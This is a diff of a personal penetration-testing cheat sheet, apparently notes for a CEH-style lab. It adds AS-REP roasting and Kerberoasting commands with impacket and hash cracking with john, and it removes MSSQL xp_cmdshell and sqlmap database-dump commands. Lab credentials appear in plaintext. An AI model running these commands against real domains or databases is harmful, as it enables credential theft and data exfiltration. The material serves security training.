@@ -1,18 +1,16 @@
-**Log into the MSSQL service using mssqlclient.py and check if xp_cmdshell is enabled  **
+**AS-REP-ROASTING**
+impacket-GetNPUsers -no-pass -usersfile users.txt -dc-ip 10.10.1.22 -debug -format john CEH.com/
+or
+python3 GetNPUsers.py CEH.com/ -no-pass -usersfile users.txt -dc-ip 10.10.1.22
 
-python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433
+**KERBEROASTING**
+1.Sprawdzenie czy w domenie znajduje się  jakiekolwiek konto użytkownika z ustawionym Service Principal Name (SPN)
+impacket-GetUserSPNs 'lab.enterprise.thm/nik:ToastyBoi!' -dc-ip enter 
+2.Wnioskowanie o ticket TGS i zapisanie do pliku
+impacket-GetUserSPNs 'lab.enterprise.thm/nik:ToastyBoi!' -dc-ip enter -request -output TGS.txt
+3.Kerberoasting has been successfull -> crack the hash
+john --wordlist=/usr/share/wordlists/rockyou.txt bitbucketTGS.txt
 
-**check whether xp_cmdshell is enabled in SQL Server**
-SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
-
-
-aining Access - dumping the SQL Database using cookie SQL Map**
->>>enumerate databases
-sqlmap -u "URL" --cookie="PHPSESSID=1234" --dbs
->>>List tables in DB
-sqlmap -u http://www.moviescope.com/viewprofile.aspx?id=1 --cookie="[cookie]" -D moviescope --tables
->>>Dump full table
-sqlmap -u "TARGET_URL" --cookie="SESSION_COOKIE" -D DATABASE_NAME -T TABLE_NAME --dump
 
 **Find file by name but in the current folder**
 find . -name filename 2>/dev/null
@@ -27,3 +25,5 @@ adb shell pm list packages -f | sed 's/package://' | while IFS='=' read apk pkg;
       echo "[+] Downloading $pkg"
       adb pull "$apk" "apks/${pkg}.apk"
 done
+
+
